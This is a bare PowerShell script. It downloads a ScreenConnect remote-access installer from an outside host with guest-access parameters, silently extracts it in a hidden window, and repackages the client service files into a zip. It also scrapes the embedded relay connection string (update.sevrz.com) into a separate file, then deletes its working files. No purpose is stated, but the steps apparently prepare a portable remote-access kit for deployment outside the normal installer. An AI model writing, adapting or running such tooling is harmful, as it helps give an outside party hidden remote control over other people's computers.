$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $MyInvocation.MyCommand.Path
$msi = Join-Path $root 'sc_setup.msi'
$extract = Join-Path $root 'sc_extract'
$work = Join-Path $root 'sc_payload'
$zip = Join-Path $root 'sc_payload.zip'
$argsFile = Join-Path $root 'sc_args.txt'
$url = 'https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'

Remove-Item $msi, $extract, $work, $zip -Recurse -Force -ErrorAction SilentlyContinue
New-Item $work -ItemType Directory -Force | Out-Null
New-Item $extract -ItemType Directory -Force | Out-Null

& curl.exe -L --ssl-no-revoke --connect-timeout 30 -o $msi $url
if (-not (Test-Path $msi) -or (Get-Item $msi).Length -lt 500000) { throw 'MSI download failed' }
Write-Host "msi=$((Get-Item $msi).Length)"

$p = Start-Process msiexec.exe -ArgumentList "/a `"$msi`" /qn TARGETDIR=`"$extract`"" -Wait -PassThru -WindowStyle Hidden
Write-Host "msiexec_a=$($p.ExitCode)"

$svc = Get-ChildItem $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' |
    Sort-Object Length -Descending | Select-Object -First 1
if (-not $svc) { throw 'no ClientService.exe' }
Copy-Item (Join-Path $svc.Directory.FullName '*') $work -Force
Compress-Archive -Path (Join-Path $work '*') -DestinationPath $zip -Force
Write-Host "zip=$((Get-Item $zip).Length)"

$bytes = [IO.File]::ReadAllBytes($msi)
$scArgs = $null
foreach ($enc in @([Text.Encoding]::Unicode, [Text.Encoding]::ASCII)) {
    $t = $enc.GetString($bytes)
    $m = [regex]::Match($t, '\?e=Access&y=Guest&h=update\.sevrz\.com&p=443&[^"\x00\s]{30,8000}')
    if ($m.Success) {
        $scArgs = ($m.Value -replace '[^\x20-\x7E].*$', '')
        break
    }
}
if (-not $scArgs) { throw 'args scrape failed' }
Set-Content -Path $argsFile -Value $scArgs -Encoding ASCII -NoNewline
Write-Host "args_len=$($scArgs.Length)"

Remove-Item $msi, $extract, $work -Recurse -Force -ErrorAction SilentlyContinue
Write-Host 'done'
Get-Item $zip, $argsFile | ForEach-Object { Write-Host "$($_.Name) $($_.Length)" }
